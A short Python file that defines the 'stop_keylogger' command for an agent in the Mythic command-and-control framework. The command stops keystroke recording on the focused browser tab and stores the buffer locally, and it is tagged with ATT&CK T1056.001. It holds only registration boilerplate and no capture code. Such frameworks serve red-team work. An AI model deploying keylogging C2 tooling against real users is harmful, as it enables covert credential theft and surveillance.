from mythic_container.MythicCommandBase import (
    CommandBase,
    CommandAttributes,
    TaskArguments,
    PTTaskMessageAllData,
    PTTaskCreateTaskingMessageResponse,
)


class StopKeyloggerArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self._args = []

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            self.load_args_from_json_string(self.command_line)


class StopKeyloggerCommand(CommandBase):
    cmd = "stop_keylogger"
    needs_admin = False
    help_cmd = "stop_keylogger"
    description = (
        "Stop recording keystrokes on the currently focused tab and flush the "
        "captured buffer into the local keylog store (retrieved with get_buffer)."
    )
    version = 1
    author = "@Fir3n0x"
    attackmapping = ["T1056.001"]
    argument_class = StopKeyloggerArguments
    attributes = CommandAttributes(
        builtin=False,
        suggested_command=False,
    )

    async def create_go_tasking(
        self, taskData: PTTaskMessageAllData
    ) -> PTTaskCreateTaskingMessageResponse:
        return PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
